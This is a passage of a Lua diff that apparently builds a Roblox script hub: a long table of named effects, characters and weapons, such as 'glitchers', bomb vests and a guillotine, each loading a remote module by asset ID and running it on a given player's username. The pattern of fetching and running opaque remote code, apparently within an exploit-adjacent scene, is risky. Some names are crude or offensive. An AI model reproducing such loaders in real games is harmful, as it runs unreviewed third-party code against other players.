@@ -1,0 +1,6421 @@
+		{
+			Name = "Goku",
+			Function = function(Username: string)
+				import(13491188006).GetVFX(Username, "Goku")
+			end
+		},
+		{
+			Name = "Deku",
+			Function = function(Username: string)
+				import(13491188006).GetVFX(Username, "OneForAll (e,r,t,f,q)")
+			end
+		},
+		{
+			Name = "KJ",
+			Function = function(Username: string)
+				import(13491188006).GetVFX(Username, "KJ")
+			end
+		},
+		{
+			Name = "Minos",
+			Function = function(Username: string)
+				import(79160189548799)(Username, "minos2")
+			end
+		},
+		{
+			Name = "Jojo",
+			Function = function(Username: string)
+				import(79160189548799)(Username, "jojo")
+			end
+		},
+		{
+			Name = "Garou",
+			Function = function(Username: string)
+				import(79160189548799)(Username, "garou2")
+			end
+		},
+		{
+			Name = "Genos",
+			Function = function(Username: string)
+				import(79160189548799)(Username, "genos")
+			end
+		},
+		{
+			Name = "Saitama",
+			Function = function(Username: string)
+				import(79160189548799)(Username, "saitama2")
+			end
+		},
+		{
+			Name = "Gojo",
+			Function = function(Username: string)
+				import(79160189548799)(Username, "sorcerer2")
+			end
+		},
+		{
+			Name = "Steve",
+			Function = function(Username: string)
+				import(0x15AF05EC7)(Username)
+			end
+		},
+		{
+			Name = "Devoyance Glitcher V4",
+			Function = function(Username: string)
+				import(7503040748)(Username)
+			end
+		},
+		{
+			Name = "Blimp",
+			Function = function(Username: string)
+				import(6029280597).load(Username)
+			end
+		},
+		{
+			Name = "Dodgeball Kid",
+			Function = function(Username: string)
+				import(4722391208).load(Username)
+			end
+		},
+		{
+			Name = "Primadon",
+			Function = function(Username: string)
+				import(15851028325)(Username)
+			end
+		},
+		{
+			Name = "Ninja Girl",
+			Function = function(Username: string)
+				import(5724295147).load(Username)
+			end
+		},
+		{
+			Name = "Neko V2",
+			Function = function(Username: string)
+				import(0x1b1dab993).neko2(Username)
+			end
+		},
+		{
+			Name = "Acorn Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Acorn")
+			end
+		},
+		{
+			Name = "Aesthetic Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Aesthetic")
+			end
+		},
+		{
+			Name = "Furry Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Furry")
+			end
+		},
+		{
+			Name = "Idk Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Idk1")
+			end
+		},
+		{
+			Name = "Idk2 Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Idk2")
+			end
+		},
+		{
+			Name = "Red Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Red")
+			end
+		},
+		{
+			Name = "Origional Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Origional")
+			end
+		},
+		{
+			Name = "Noob Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Noob")
+			end
+		},
+		{
+			Name = "Moves+ Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Moves+")
+			end
+		},
+		{
+			Name = "Maid+ Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Maid+")
+			end
+		},
+		{
+			Name = "Maid Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "Maid")
+			end
+		},
+		{
+			Name = "Kawaii Pink Neko Owner",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "KawaiiPinkOwner")
+			end
+		},
+		{
+			Name = "Kawaii Shark Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "KawaiiShark")
+			end
+		},
+		{
+			Name = "Kawaii Pink Neko",
+			Function = function(Username: string)
+				import(15730425960).GetNEKO(Username, "KawaiiPink")
+			end
+		},
+		{
+			Name = "Soul Glitcher",
+			Function = function(Username: string) import(15670878040)(Username) end
+		},
+		{
+			Name = "AB Glitcher",
+			Function = function(Username: string) import(5327169228).K(Username) end
+		},
+		{
+			Name = "AR Glitcher",
+			Function = function(Username: string) import(5327181484).K(Username) end
+		},
+		{
+			Name = "AS Glitcher Remake",
+			Function = function(Username: string) import(5028861667).a(Username) end
+		},
+		{
+			Name = "AXI Glitcher",
+			Function = function(Username: string) import(5341264530).a(Username) end
+		},
+		{
+			Name = "Alone Glitcher",
+			Function = function(Username: string) import(4680339818).load(Username,'test') end
+		},
+		{
+			Name = "Artuco's Star Glitcher",
+			Function = function(Username: string) import(5349677617).kaspfix(Username) end
+		},
+		{
+			Name = "Auxnos Glitcher Edit",
+			Function = function(Username: string) import(5347017636).a(Username) end
+		},
+		{
+			Name = "Auxnos UXI Glitcher",
+			Function = function(Username: string) import(5332174664)(Username,'test') end
+		},
+		{
+			Name = "CT Glitcher",
+			Function = function(Username: string) import(5340401334).a(Username) end
+		},
+		{
+			Name = "Infinite Glitcher",
+			Function = function(Username: string) import(4806491707).load(Username) end
+		},
+		{
+			Name = "Unfair Glitcher",
+			Function = function(Username: string) import(4658450282).unfair(Username) end
+		},
+		{
+			Name = "Interstellar Glitcher",
+			Function = function(Username: string) import(4798411424).load(Username) end
+		},
+		{
+			Name = "Powerful Glitcher",
+			Function = function(Username: string) import(5366855889).kaspydaspy(Username) end
+		},
+		{
+			Name = "IDK GLITCHER",
+			Function = function(Username: string) import(4820509464).load(Username) end
+		},
+		{
+			Name = "Reminisence Cytus Glitcher",
+			Function = function(Username: string) import(4794053805).loadremcytus(Username) end
+		},
+		{
+			Name = "Inlustris Glitcher",
+			Function = function(Username: string) import(4524036830).load(Username) end
+		},
+		{
+			Name = "Sadpm Glitcher",
+			Function = function(Username: string) import(4809749920).load(Username) end
+		},
+		{
+			Name = "UXI Glitcher",
+			Function = function(Username: string) import(4588147594)(Username) end
+		},
+		{
+			Name = "N Glitcher R",
+			Function = function(Username: string) import(4159808902).load(Username) end
+		},
+		{
+			Name = "Undertale Glitcher",
+			Function = function(Username: string) import(4870843783).untg(Username) end
+		},
+		{
+			Name = "Disabled Glitcher",
+			Function = function(Username: string) import(4878879957).load(Username) end
+		},
+		{
+			Name = "Thiago Glitcher V2",
+			Function = function(Username: string) import(4989985451).V7(Username,'hack') end
+		},
+		{
+			Name = "Star Glitcher Edit",
+			Function = function(Username: string) import(4758301358).lol(Username,'test') end
+		},
+		{
+			Name = "Intro Glitcher",
+			Function = function(Username: string) import(4832813094).load(Username,'hack') end
+		},
+		{
+			Name = "Undertale Glitcher V2",
+			Function = function(Username: string) import(5190828173).load(Username) end
+		},
+		{
+			Name = "Karma Glitcher",
+			Function = function(Username: string) import(4733288689).load(Username) end
+		},
+		{
+			Name = "D Glitcher : UC",
+			Function = function(Username: string) import(4765292709).collide(Username,'hack') end
+		},
+		{
+			Name = "Earthy Glitcher",
+			Function = function(Username: string) import(4844605481).load(Username,'test') end
+		},
+		{
+			Name = "Soda Glitcher",
+			Function = function(Username: string) import(4988251184).oof(Username) end
+		},
+		{
+			Name = "Cringe Glitcher",
+			Function = function(Username: string) import(5240515190).k(Username) end
+		},
+		{
+			Name = "Proxy Glitcher",
+			Function = function(Username: string) import(5636332101).mhm(Username) end
+		},
+		{
+			Name = "Uxi Reborn",
+			Function = function(Username: string) import(4875475056)(Username) end
+		},
+		{
+			Name = "Synthezizer Glitcher",
+			Function = function(Username: string) import(5334661153).a(Username) end
+		},
+		{
+			Name = "Shattered Light Glitcher",
+			Function = function(Username: string) import(5341071818).a(Username) end
+		},
+		{
+			Name = "Russian Cringe Glitcher",
+			Function = function(Username: string) import(5338656014).a(Username) end
+		},
+		{
+			Name = "Ducko Glitcher",
+			Function = function(Username: string) import(5338896073).a(Username) end
+		},
+		{
+			Name = "Wao Glitcher",
+			Function = function(Username: string) import(4709101293).load(Username) end
+		},
+		{
+			Name = "Dimensional Paradox Glitcher",
+			Function = function(Username: string) import(5340942034).a(Username,'test') end
+		},
+		{
+			Name = "Super Derpz Glitcher",
+			Function = function(Username: string) import(5340942034).a(Username) end
+		},
+		{
+			Name = "Quiet Glitcher",
+			Function = function(Username: string) import(5341272312).a(Username) end
+		},
+		{
+			Name = "Ryan Star Glitcher",
+			Function = function(Username: string) import(5341038343).a(Username) end
+		},
+		{
+			Name = "OP Glitcher",
+			Function = function(Username: string) import(5341200009).a(Username) end
+		},
+		{
+			Name = "Super MS Glitcher",
+			Function = function(Username: string) import(4764867303).Super_MSG(Username) end
+		},
+		{
+			Name = "Ethereal Glitcher",
+			Function = function(Username: string) import(5331669292).kasperfixedthis(Username) end
+		},
+		{
+			Name = "Galaxy Glitcher",
+			Function = function(Username: string) import(4721766508):GalaxyGlitcher(Username) end
+		},
+		{
+			Name = "Universal MS Glitcher",
+			Function = function(Username: string) import(4841108027).MSG(Username,'hack') end
+		},
+		{
+			Name = "Murderer Glitcher",
+			Function = function(Username: string) import(4785070948).load(Username) end
+		},
+		{
+			Name = "Chaos Star Glitcher",
+			Function = function(Username: string) import(4875407477).load(Username) end
+		},
+		{
+			Name = "Sky Glitcher",
+			Function = function(Username: string) import(3564207744):sky(Username) end
+		},
+		{
+			Name = "Concelaed Glitcher",
+			Function = function(Username: string) import(4780808834).load(Username,'hack') end
+		},
+		{
+			Name = "Derpz Glitcher",
+			Function = function(Username: string) import(4759296590).load(Username,'hack') end
+		},
+		{
+			Name = "Star Glitcher V7",
+			Function = function(Username: string) import(4737096190).load(Username) end
+		},
+		{
+			Name = "Nova Glitcher",
+			Function = function(Username: string) import(5346634529).a(Username) end
+		},
+		{
+			Name = "Russian Star Glitcher",
+			Function = function(Username: string) import(4803833182):SpectrumOP(Username,'hack') end
+		},
+		{
+			Name = "Cytus Glitcher Edit",
+			Function = function(Username: string) import(4658383884).cytus(Username) end
+		},
+		{
+			Name = "Kek's Star Glitcher",
+			Function = function(Username: string) import(4692718699):SpectrumOP(Username) end
+		},
+		{
+			Name = "Original Star Glitcher",
+			Function = function(Username: string) import(15644847904)(Username) end
+		},
+		{
+			Name = "Strat v2 Glitcher",
+			Function = function(Username: string) import(11792033063).FUZION(Username) end
+		},
+		{
+			Name = "Finium Glitcher",
+			Function = function(Username: string) import(11797213354).FUZION(Username) end
+		},
+		{
+			Name = "Sprectraversum Glitcher",
+			Function = function(Username: string) import(11791988807).FUZION(Username) end
+		},
+		{
+			Name = "Exsorius Glitcher",
+			Function = function(Username: string) import(11792006247).FUZION(Username) end
+		},
+		{
+			Name = "Arbitrarium Glitcher",
+			Function = function(Username: string) import(11791792396).FUZION(Username) end
+		},
+		{
+			Name = "Guest Glitcher",
+			Function = function(Username: string) import(14746263182)(Username) end
+		},
+		{
+			Name = "Parallelence Glitcher",
+			Function = function(Username: string) import(7686265209).load(Username) end
+		},
+		{
+			Name = "Awoken Glitcher",
+			Function = function(Username: string) import(6223977609).giveSortermRW(Username) end
+		},
+		{
+			Name = "Excellence Glitcher",
+			Function = function(Username: string) import(7686271856).load(Username) end
+		},
+		{
+			Name = "Devoyance Glitcher V3",
+			Function = function(Username: string) import(7619760576)(Username) end
+		},
+		{
+			Name = "Severance Glitcher",
+			Function = function(Username: string) import(7683335255).load(Username) end
+		},
+		{
+			Name = "Nebula Star Glitcher V1.2",
+			Function = function(Username: string) import(14746482667)(Username) end
+		},
+		{
+			Name = "Nebula Star Glitcher V1",
+			Function = function(Username: string) import(14197855368)(Username) end
+		},
+		{
+			Name = "NI-CISYNIA Glitcher",
+			Function = function(Username: string) import(7667220373).load(Username) end
+		},
+		{
+			Name = "Characterization Glitcher",
+			Function = function(Username: string) import(5513812536).Characterization(Username) end
+		},
+		{
+			Name = "Galaxy Glitcher Anime Edit",
+			Function = function(Username: string) import(6174059995):GalaxyGlitcher(Username) end
+		},
+		{
+			Name = "TYTMXHFL rela's Edit Glitcher 1",
+			Function = function(Username: string) import(6832350385).load(Username) end
+		},
+		{
+			Name = "TYTMXHFL rela's Edit Glitcher 2",
+			Function = function(Username: string) import(6911774967).load(Username) end
+		},
+		{
+			Name = "Chromospheric Glitcher",
+			Function = function(Username: string) import(7610956320).chromo(Username) end
+		},
+		{
+			Name = "Last Star Glitcher",
+			Function = function(Username: string)
+				local a = Instance.new("Folder")
+				a.Parent = workspace[Username]
+				a.Name = "Health"
+				task.defer(import(7327437424).OMG, Username)
+			end
+		},
+		{
+			Name = "Cytus Edit Glitcher",
+			Function = function(Username: string) import(6304280002).punitus(Username) end
+		},
+		{
+			Name = "Derpz Glitcher: The Final Chapter",
+			Function = function(Username: string) import(6304832125).RGT(Username) end
+		},
+		{
+			Name = "GX Glitcher",
+			Function = function(Username: string) import(6002457001).load(Username) end
+		},
+		{
+			Name = "Help Glitcher",
+			Function = function(Username: string) import(6291191232).load(Username) end
+		},
+		{
+			Name = "Hemispheric Glitcher",
+			Function = function(Username: string) import(5090401326)(Username) end
+		},
+		{
+			Name = "Liksn11 Glitcher",
+			Function = function(Username: string) import(5954900168).liksn11(Username) end
+		},
+		{
+			Name = "Omni Glitcher",
+			Function = function(Username: string) import(6086929981).load(Username) end
+		},
+		{
+			Name = "Abstract Glitcher V1.2",
+			Function = function(Username: string) import(5783387105).load(Username) end
+		},
+		{
+			Name = "Artuco's Star Glitcher V2",
+			Function = function(Username: string) import(5898340652).load(Username) end
+		},
+		{
+			Name = "Awakened Glitcher",
+			Function = function(Username: string) import(5689227186)(Username) end
+		},
+		{
+			Name = "Cyan Glitcher",
+			Function = function(Username: string) import(5783070713).load(Username) end
+		},
+		{
+			Name = "Cytus 2R Glitcher",
+			Function = function(Username: string) import(4949972461).load(Username) end
+		},
+		{
+			Name = "Sans Glitcher",
+			Function = function(Username: string) import(5489432435).GayGlitcherLeaked("old trash", Username) end
+		},
+		{
+			Name = "Soda Switcher Glitcher",
+			Function = function(Username: string) import(5775182857).ssg(Username) end
+		},
+		{
+			Name = "Spectrum Glitcher CR (-stop)",
+			Function = function(Username: string) import(5782848272).yeet(Username) end
+		},
+		{
+			Name = "Robot Glitcher",
+			Function = function(Username: string) import(5349719082).eliza(Username) end
+		},
+		{
+			Name = "Sky Glitcher",
+			Function = function(Username: string) import(3564207744):sky(Username) end
+		},
+		{
+			Name = "Apectrum Glitcher",
+			Function = function(Username: string) import(4809742472).load(Username) end
+		},
+		{
+			Name = "Spectrum Glitcher",
+			Function = function(Username: string) import(15670920963)(Username) end
+		},
+		{
+			Name = "Star Glitcher",
+			Function = function(Username: string) import(4721922423).load(Username, "test") end
+		},
+		{
+			Name = "Star Glitcher V7",
+			Function = function(Username: string) import(4737096190).load(Username) end
+		},
+		{
+			Name = "Star Time Glitcher",
+			Function = function(Username: string) import(5480093885):StarGlitcherTime(Username) end
+		},
+		{
+			Name = "Sythenizer Glitcher",
+			Function = function(Username: string) import(5339705018).load(Username) end
+		},
+		{
+			Name = "Thiago's Glitcher",
+			Function = function(Username: string) import(4840594675).bro(Username) end
+		},
+		{
+			Name = "Ultimate Star Glitcher",
+			Function = function(Username: string) import(15612469847)(Username) end
+		},
+		{
+			Name = "Warrior Glitcher",
+			Function = function(Username: string) import(4658039182).load(Username) end
+		},
+		{
+			Name = "Paragon Glitcher",
+			Function = function(Username: string) import(4722335098).load(Username) end
+		},
+		{
+			Name = "Friend Glitcher",
+			Function = function(Username: string) import(4709101293).load(Username) end
+		},
+		{
+			Name = "Universal Glitcher",
+			Function = function(Username: string) import(4754386252).load(Username) end
+		},
+		{
+			Name = "Onii Glitcher",
+			Function = function(Username: string) import(5527846512).NewOnii(Username) end
+		},
+		{
+			Name = "Soul Glitcher",
+			Function = function(Username: string) import(5581466263).Soul(Username) end
+		},
+		{
+			Name = "Chaotic Glitcher",
+			Function = function(Username: string) import(6234005961).load(Username) end
+		},
+		{
+			Name = "Golden Glitcher",
+			Function = function(Username: string) import(5944671398).golden(Username) end
+		},
+		{
+			Name = "Super Reality Glitcher",
+			Function = function(Username: string) import(4957436288).load(Username) end
+		},
+		{
+			Name = "Unithereal Glitcher Edit",
+			Function = function(Username: string) import(5024713750)(Username) end
+		},
+		{
+			Name = "AOM Glitcher Edit",
+			Function = function(Username: string) import(4721760220):yes(Username) end
+		},
+		{
+			Name = "Till It's Over Glitcher",
+			Function = function(Username: string) import(5324939683).tillitsover(Username) end
+		},
+		{
+			Name = "Decimation Glitcher",
+			Function = function(Username: string) import(6602728152)(Username) end
+		},
+		{
+			Name = "Auxnos Glitcher V2",
+			Function = function(Username: string) import(5366687826)(Username) end
+		},
+		{
+			Name = "Axiom Glitcher",
+			Function = function(Username: string) import(4859515241).load(Username) end
+		},
+		{
+			Name = "Big Axiom Glitcher",
+			Function = function(Username: string) import(5320792048).load(Username) end
+		},
+		{
+			Name = "Chaos Glitcher Rewritten",
+			Function = function(Username: string) import(3411076957).load(Username) end
+		},
+		{
+			Name = "Etheral Glitcher Rewrite",
+			Function = function(Username: string) import(14819327681)(Username) end
+		},
+		{
+			Name = "Cyrus Glitcher",
+			Function = function(Username: string) import(4709075479).load(Username) end
+		},
+		{
+			Name = "Celestial Glitcher",
+			Function = function(Username: string) import(0x2f720eb8c).FUZION(Username) end
+		},
+		{
+			Name = "Dimensional Glitcher",
+			Function = function(Username: string) import(4568781811).feetus(Username) end
+		},
+		{
+			Name = "Etheral Glitcher",
+			Function = function(Username: string) import(5195082409).load(Username) end
+		},
+		{
+			Name = "External Glitcher",
+			Function = function(Username: string) import(7696090372).load(Username) end
+		},
+		{
+			Name = "Friend Glitcher Reborn",
+			Function = function(Username: string) import(4697789672).cyrus(Username) end
+		},
+		{
+			Name = "Galaxy Glitcher",
+			Function = function(Username: string) import(4721766508):GalaxyGlitcher(Username) end
+		},
+		{
+			Name = "Gek Glitcher",
+			Function = function(Username: string) import(4789736147).load(Username) end
+		},
+		{
+			Name = "Leaf Glitcher",
+			Function = function(Username: string) import(5011085256).load(Username) end
+		},
+		{
+			Name = "MS Glitcher",
+			Function = function(Username: string) import(4841108027).MSG(Username) end
+		},
+		{
+			Name = "Meme Glitcher",
+			Function = function(Username: string) import(4667651562).load(Username) end
+		},
+		{
+			Name = "Midnight Glitcher",
+			Function = function(Username: string) import(4687981421).load(Username) end
+		},
+		{
+			Name = "Mr Pixels Glitcher",
+			Function = function(Username: string) import(4178465932).MPG(Username) end
+		},
+		{
+			Name = "Murderer Glitcher",
+			Function = function(Username: string) import(4785070948).load(Username) end
+		},
+		{
+			Name = "Nebula Star Glitcher V1.1",
+			Function = function(Username: string) import(4749896781).no(Username) end
+		},
+		{
+			Name = "PewDiePie Star Glitcher",
+			Function = function(Username: string) import(4667651562).load(Username) end
+		},
+		{
+			Name = "Quantom Glitcher",
+			Function = function(Username: string) import(4652539736)(Username) end
+		},
+		{
+			Name = "Reality Glitcher",
+			Function = function(Username: string) import(4721789462).noxd(Username) end
+		},
+		{
+			Name = "Reminence Glitcher",
+			Function = function(Username: string) import(4791595149).load(Username) end
+		},
+		{
+			Name = "Elio Blasio",
+			Function = function(Username: string) import(15671657481)(Username) end
+		},
+		{
+			Name = "Police Blasio",
+			Function = function(Username: string) import(5049336886):Fire(Username, "test") end
+		},
+		{
+			Name = "Queens Guard Blasio",
+			Function = function(Username: string) import(5049852860):Fire(Username, "test") end
+		},
+		{
+			Name = "Swat Blasio",
+			Function = function(Username: string) import(5054849946):Fire(Username, "test") end
+		},
+		{
+			Name = "Syrian Soldier Blasio",
+			Function = function(Username: string) import(4967315171).load(Username) end
+		},
+		{
+			Name = "Trump Blasio",
+			Function = function(Username: string) import(5186991208).load(Username) end
+		},
+		{
+			Name = "Aether Lightning / Lightning Emperor",
+			Function = function(Username: string) import(14598983917)(Username) end
+		},
+		{
+			Name = "Executioner Brutallus",
+			Function = function(Username: string) import(14631433187)(Username) end
+		},
+		{
+			Name = "Bomb Vest V2",
+			Function = function(Username: string) import(0x49731b7f).load(Username) end
+		},
+		{
+			Name = "Bomb Vest V1",
+			Function = function(Username: string) import(0x39d9879d).load(Username) end
+		},
+		{
+			Name = "Nuclear Missile Launcher Edit",
+			Function = function(Username: string) import(14208473055)(Username) end
+		},
+		{
+			Name = "Nuclear Missile Launcher",
+			Function = function(Username: string) import(14208469834)(Username) end
+		},
+		{
+			Name = "Nuclear Missile",
+			Function = function(Username: string) import(7804327506).amigodogodenot123(Username) end
+		},
+		{
+			Name = "Sledge Hammer",
+			Function = function(Username: string) import(8038037940).CLoad(Username) end
+		},
+		{
+			Name = "Wind Katana",
+			Function = function(Username: string) import(14175063457)(Username) end
+		},
+		{
+			Name = "Gunjourer",
+			Function = function(Username: string) import(14175074837)(Username) end
+		},
+		{
+			Name = "Dominus Empyreus",
+			Function = function(Username: string) import(14175081924)(Username) end
+		},
+		{
+			Name = "Bow Master",
+			Function = function(Username: string) import(14175067340)(Username) end
+		},
+		{
+			Name = "Abyss Eye",
+			Function = function(Username: string) import(14175105993)(Username) end
+		},
+		{
+			Name = "Singing Me",
+			Function = function(Username: string) import(14187594656)(Username) end
+		},
+		{
+			Name = "Trap Rifle",
+			Function = function(Username: string) import(18952834050)(Username) end
+		},
+		{
+			Name = "Notive",
+			Function = function(Username: string) import(14175901126)(Username) end
+		},
+		{
+			Name = "Fred Bear",
+			Function = function(Username: string) import(13761549843).pedobear(Username) end
+		},
+		{
+			Name = "Lunarist Gauntlet",
+			Function = function(Username: string) import(14175883434)(Username) end
+		},
+		{
+			Name = "Hooded Arch Angel",
+			Function = function(Username: string) import(14175891187)(Username) end
+		},
+		{
+			Name = "Skull Kid",
+			Function = function(Username: string) import(14175894408)(Username) end
+		},
+		{
+			Name = "Marble Stun Hammer",
+			Function = function(Username: string) import(14174944324)(Username) end
+		},
+		{
+			Name = "Preach",
+			Function = function(Username: string) import(14174908319)(Username) end
+		},
+		{
+			Name = "Creep",
+			Function = function(Username: string) import(14174895980)(Username) end
+		},
+		{
+			Name = "Internal War",
+			Function = function(Username: string) import(15583664823)(Username) end
+		},
+		{
+			Name = "Pizza Guy",
+			Function = function(Username: string) import(14021508601).load(Username) end
+		},
+		{
+			Name = "Wiron",
+			Function = function(Username: string) import(7972125129).CLoad(Username) end
+		},
+		{
+			Name = "Wasp Fighter Jet",
+			Function = function(Username: string) import(5860060462).load(Username) end
+		},
+		{
+			Name = "Tiny Infernus",
+			Function = function(Username: string) import(8828734242)(Username) end
+		},
+		{
+			Name = "Rolling Ball Omen",
+			Function = function(Username: string) import(8824302289).omen(Username) end
+		},
+		{
+			Name = "Road Rogue",
+			Function = function(Username: string) import(7473216460).load(Username) end
+		},
+		{
+			Name = "Mercenary",
+			Function = function(Username: string) import(5177488826).Soldier(Username) end
+		},
+		{
+			Name = "Halo Master Chief",
+			Function = function(Username: string) import(5812973403).Halo(Username) end
+		},
+		{
+			Name = "Gale Fighter",
+			Function = function(Username: string) import(14746230926)(Username) end
+		},
+		{
+			Name = "Fruit Launcher",
+			Function = function(Username: string) import(6226957648).load(Username) end
+		},
+		{
+			Name = "Flying Spaceship",
+			Function = function(Username: string) import(4922372692).load(Username) end
+		},
+		{
+			Name = "Firework Organizer",
+			Function = function(Username: string) import(8824302289).omen(Username) end
+		},
+		{
+			Name = "Elite Combine",
+			Function = function(Username: string) import(7548845598).load(Username) end
+		},
+		{
+			Name = "Eden Security Drone",
+			Function = function(Username: string) import(4021519500).load(Username) end
+		},
+		{
+			Name = "Atlas Axe",
+			Function = function(Username: string) import(15584439634)(Username) end
+		},
+		{
+			Name = "Memento Mori",
+			Function = function(Username: string) import(7473246984).load(Username) end
+		},
+		{
+			Name = "Sadique / Sadist Redux",
+			Function = function(Username: string) import(15584398188)(Username) end
+		},
+		{
+			Name = "Broken Angel",
+			Function = function(Username: string) import(14735053241)(Username) end
+		},
+		{
+			Name = "Goner",
+			Function = function(Username: string) import(4536456687):Fire(Username, "a") end
+		},
+		{
+			Name = "Telekinesis",
+			Function = function(Username: string) import(5201088212).load(Username, "test") end
+		},
+		{
+			Name = "Ender",
+			Function = function(Username: string) import(15584589628)(Username) end
+		},
+		{
+			Name = "Ender?",
+			Function = function(Username: string) import(14175049007)(Username) end
+		},
+		{
+			Name = "Eyo-Zen V2",
+			Function = function(Username: string) import(5892684980).load(Username) end
+		},
+		{
+			Name = "What Another One V1.5",
+			Function = function(Username: string) import(15584614585)(Username) end
+		},
+		{
+			Name = "Omni God",
+			Function = function(Username: string) import(14186351007)(Username) end
+		},
+		{
+			Name = "Outcast",
+			Function = function(Username: string) import(5229592351).eliza(Username) end
+		},
+		{
+			Name = "Comedic Chaos",
+			Function = function(Username: string) import(8837899654).load(Username) end
+		},
+		{
+			Name = "Demoknight",
+			Function = function(Username: string) import(9075443934).load(Username) end
+		},
+		{
+			Name = "True Madness V2",
+			Function = function(Username: string) import(8038084808).CLoad(Username) end
+		},
+		{
+			Name = "Notive",
+			Function = function(Username: string) import(14175901126)(Username) end
+		},
+		{
+			Name = "Distraught Fire Elemental",
+			Function = function(Username: string) import(6492319825).load(Username) end
+		},
+		{
+			Name = "Red Mist",
+			Function = function(Username: string) import(7473206349).load(Username) end
+		},
+		{
+			Name = "Chess King",
+			Function = function(Username: string) import(6223977609).ChessKing(Username) end
+		},
+		{
+			Name = "Animation Man",
+			Function = function(Username: string) import(8076428410).CLoad(Username) end
+		},
+		{
+			Name = "Florus",
+			Function = function(Username: string) import(7972247318).CLoad(Username) end
+		},
+		{
+			Name = "Pet Leash",
+			Function = function(Username: string) import(8375420639).get("PetLeash", Username) end
+		},
+		{
+			Name = "Terraprisma",
+			Function = function(Username: string) import(8038024771).CLoad(Username) end
+		},
+		{
+			Name = "Night's Edge",
+			Function = function(Username: string) import(8665701840).load(Username) end
+		},
+		{
+			Name = "Minecraft Potions",
+			Function = function(Username: string) import(8753925776)(Username,true) end
+		},
+		{
+			Name = "Zal_go The Corruptor",
+			Function = function(Username: string) import(8165331700).load(Username) end
+		},
+		{
+			Name = "Thanos",
+			Function = function(Username: string) import(2960340602):Fire(Username, "test") end
+		},
+		{
+			Name = "Draw",
+			Function = function(Username: string) import(2966602068):Fire(Username, "test") end
+		},
+		{
+			Name = "Meerin",
+			Function = function(Username: string) import(14746251055)(Username) end
+		},
+		{
+			Name = "Neptunian V5 Remake",
+			Function = function(Username: string) import(14217235618)(Username) end
+		},
+		{
+			Name = "Buff Noob",
+			Function = function(Username: string) import(2946085544):Fire(Username, "hack") end
+		},
+		{
+			Name = "Dominus Astra",
+			Function = function(Username: string) import(2946064785):Fire(Username, "hack") end
+		},
+		{
+			Name = "Chara V1",
+			Function = function(Username: string) import(2945816118):Fire(Username, "hack") end
+		},
+		{
+			Name = "Jane Doe",
+			Function = function(Username: string) import(4599267783).ooga(Username) end
+		},
+		{
+			Name = "Diamond Sword",
+			Function = function(Username: string) import(5300507859).Dark(Username) end
+		},
+		{
+			Name = "Evelyn",
+			Function = function(Username: string) import(14746272931)(Username) end
+		},
+		{
+			Name = "Shopping Cart",
+			Function = function(Username: string) import(2959866384):Fire(Username, "test") end
+		},
+		{
+			Name = "Nullioner",
+			Function = function(Username: string) import(7972181516).CLoad(Username) end
+		},
+		{
+			Name = "Soul Reaper",
+			Function = function(Username: string) import(7972086233).CLoad(Username) end
+		},
+		{
+			Name = "Craze Runner",
+			Function = function(Username: string) import(7972228214).CLoad(Username) end
+		},
+		{
+			Name = "Crawl",
+			Function = function(Username: string) import(7972019185).CLoad(Username) end
+		},
+		{
+			Name = "Parkour",
+			Function = function(Username: string) import(8076509064).CLoad(Username) end
+		},
+		{
+			Name = "True Insanity",
+			Function = function(Username: string) import(7972153307).CLoad(Username) end
+		},
+		{
+			Name = "Vancuit",
+			Function = function(Username: string) import(8037922072).CLoad(Username) end
+		},
+		{
+			Name = "Dvd Man",
+			Function = function(Username: string) import(6843126490).dvd(Username) end
+		},
+		{
+			Name = "Deadly Lazer Sun V3",
+			Function = function(Username: string) import(4528360948):Fire(Username, "hack") end
+		},
+		{
+			Name = "Deadly Lazer Sun V2",
+			Function = function(Username: string) end
+		},
+		{
+			Name = "Deadly Lazer Sun V1",
+			Function = function(Username: string) import(4658348819):Fire(Username, "hack") end
+		},
+		{
+			Name = "Biggest Memer",
+			Function = function(Username: string) import(6295686651)(Username) end
+		},
+		{
+			Name = "Da Feets",
+			Function = function(Username: string) import(6223977609)['Da  feets'](Username) end
+		},
+		{
+			Name = "Portable Screen",
+			Function = function(Username: string) import(5928380931).load(Username) end
+		},
+		{
+			Name = "Crazy Dance",
+			Function = function(Username: string) import(7515404366)(Username,"distract") end
+		},
+		{
+			Name = "Solem Vow",
+			Function = function(Username: string) import(7400426012).load(Username) end
+		},
+		{
+			Name = "The Boys",
+			Function = function(Username: string) import(7473297462).load(Username) end
+		},
+		{
+			Name = "Mimicry",
+			Function = function(Username: string) import(7400411100).load(Username) end
+		},
+		{
+			Name = "Meme Machine",
+			Function = function(Username: string) import(2959842532):Fire(Username,"test") end
+		},
+		{
+			Name = "Slaughter Bob",
+			Function = function(Username: string) import(7082061549).detroitbottom(Username) end
+		},
+		{
+			Name = "Liron",
+			Function = function(Username: string) import(7071265233).load(Username) end
+		},
+		{
+			Name = "Omega",
+			Function = function(Username: string) import(6856371401)(Username) end
+		},
+		{
+			Name = "Crazy Ex",
+			Function = function(Username: string) import(6953422184)(Username) end
+		},
+		{
+			Name = "Guillotine (Playername)",
+			Function = function(Username: string) import(5786385249)("mald", Username, "guillotine") end
+		},
+		{
+			Name = "Firing Squad (Playername)",
+			Function = function(Username: string) import(5786385249)("mald", Username, "squad") end
+		},
+		{
+			Name = "Arsenal Delinquent",
+			Function = function(Username: string) import(1525600089).goldentec(Username) end
+		},
+		{
+			Name = "Sin Ultimate",
+			Function = function(Username: string) import(6583572269).load(Username) end
+		},
+		{
+			Name = "Doge Army",
+			Function = function(Username: string) import(5115249013).fehack(Username) end
+		},
+		{
+			Name = "Minion Army",
+			Function = function(Username: string) import(3224813865).load(Username) end
+		},
+		{
+			Name = "Mirror Man Edit",
